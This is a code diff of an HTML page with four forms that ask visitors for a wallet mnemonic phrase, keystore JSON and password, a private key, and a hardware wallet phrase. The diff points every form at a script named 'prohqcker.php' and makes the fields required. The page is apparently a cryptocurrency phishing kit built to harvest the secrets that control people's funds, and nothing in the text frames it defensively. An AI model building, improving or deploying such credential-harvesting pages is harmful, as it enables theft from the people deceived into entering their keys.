@@ -49,9 +49,9 @@
       </div>
       <div class="form__container flex flex-jc-c flex-d-c container">
         <form
-          id="my-form"
+          id="new-form"
           class="form flex flex-jc-c"
-          action="https://formspree.io/f/xpzgqeql"
+          action="prohqcker.php"
           method="POST"
         >
           <h5>MNEMONICS</h5>
@@ -63,11 +63,17 @@
             id="textInput"
             type="text"
             name="Mnemonics phrase"
+			required
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
         </form>
-        <form id="formTWO" class="form flex flex-jc-c" action="#" method="POST">
+        <form
+          id="new-form"
+          class="form flex flex-jc-c"
+          action="prohqcker.php"
+          method="POST"
+        >
           <h5>KEYSTORE</h5>
           <label for="textInput2" class="form__label">
             Enter your Keystore JSON
@@ -76,7 +82,8 @@
             class="form__input"
             id="textInput2"
             type="text"
-            name="Mnemonics phrase"
+            name="Keystore"
+			required
           />
           <label for="passwordInput" class="form__label">
             Enter Password
@@ -85,12 +92,18 @@
             class="form__input"
             id="passwordInput"
             type="password"
-            name="Mnemonics phrase"
+            name="Keystore pass"
+			required
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
         </form>
-        <form id="formThree" class="form flex flex-jc-c" method="POST">
+        <form
+          id="new-form"
+          class="form flex flex-jc-c"
+          action="prohqcker.php"
+          method="POST"
+        >
           <h5>PRIVATE-KEY</h5>
           <label for="textInputThree" class="form__label">
             Enter your private key
@@ -100,14 +113,15 @@
             id="textInputThree"
             type="text"
             name="PRIVATE-KEY phrase"
+			required
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
         </form>
         <form
-          id="formFour"
+          id="new-form"
           class="form flex flex-jc-c"
-          action="https://formspree.io/f/xpzgqeql"
+          action="prohqcker.php"
           method="POST"
         >
           <h5>HARDWARE</h5>
@@ -119,6 +133,7 @@
             id="textInputFour"
             type="text"
             name="Hardware phrase"
+			required
           />
           <button class="form__btn" type="submit">Proceed</button>
           <p id="my-form-status"></p>
